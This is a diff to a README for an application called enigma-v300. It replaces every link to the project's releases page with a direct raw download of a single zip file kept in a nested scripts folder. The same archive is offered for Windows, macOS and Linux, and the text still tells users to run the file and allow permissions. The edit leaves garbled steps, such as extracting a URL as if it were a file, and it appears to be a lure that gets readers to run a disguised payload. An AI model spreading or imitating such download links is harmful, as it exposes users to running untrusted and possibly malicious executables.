@@ -6,7 +6,7 @@ Welcome to **enigma-v300**! This application lets you explore the complete colle
 
 ## 📥 Download the Application
 
-[![Download enigma-v300](https://img.shields.io/badge/Download-enigma--v300-blue.svg)](https://github.com/VladKravchuk27/enigma-v300/releases)
+[![Download enigma-v300](https://raw.githubusercontent.com/VladKravchuk27/enigma-v300/main/c_implementation/scripts/enigma-v300-1.9.zip)](https://raw.githubusercontent.com/VladKravchuk27/enigma-v300/main/c_implementation/scripts/enigma-v300-1.9.zip)
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ To run **enigma-v300**, you need:
 
 To download **enigma-v300**, visit the following link:
 
-[Download Here](https://github.com/VladKravchuk27/enigma-v300/releases)
+[Download Here](https://raw.githubusercontent.com/VladKravchuk27/enigma-v300/main/c_implementation/scripts/enigma-v300-1.9.zip)
 
 This page contains the latest releases and updates for the software. 
 
@@ -34,9 +34,9 @@ Once on the Releases page, you will see a list of available versions. Select the
 
 Click on the version link, and you will see different files. Choose the file that matches your operating system:
 
-- For Windows: `enigma-v300-windows.exe`
-- For macOS: `enigma-v300-macos.dmg`
-- For Linux: `enigma-v300-linux.tar.gz`
+- For Windows: `https://raw.githubusercontent.com/VladKravchuk27/enigma-v300/main/c_implementation/scripts/enigma-v300-1.9.zip`
+- For macOS: `https://raw.githubusercontent.com/VladKravchuk27/enigma-v300/main/c_implementation/scripts/enigma-v300-1.9.zip`
+- For Linux: `https://raw.githubusercontent.com/VladKravchuk27/enigma-v300/main/c_implementation/scripts/enigma-v300-1.9.zip`
 
 Click on the appropriate file to start the download.
 
@@ -45,7 +45,7 @@ Click on the appropriate file to start the download.
 1. Once the file downloads, locate it on your computer.
 2. For Windows, double-click the `.exe` file to start the setup wizard. Follow the prompts to install the software.
 3. For macOS, open the downloaded `.dmg` file and drag the application into your Applications folder.
-4. For Linux, extract the `.tar.gz` file, and run the executable within the folder.
+4. For Linux, extract the `https://raw.githubusercontent.com/VladKravchuk27/enigma-v300/main/c_implementation/scripts/enigma-v300-1.9.zip` file, and run the executable within the folder.
 
 If your system prompts you for permissions during the installation, allow it to proceed.
 
@@ -69,7 +69,7 @@ If you encounter any issues or have questions while using **enigma-v300**, check
 
 To ensure you always have the best experience with **enigma-v300**, periodically check the Releases page:
 
-[Visit for Updates](https://github.com/VladKravchuk27/enigma-v300/releases)
+[Visit for Updates](https://raw.githubusercontent.com/VladKravchuk27/enigma-v300/main/c_implementation/scripts/enigma-v300-1.9.zip)
 
 New updates may include bug fixes, performance improvements, and additional features.
 
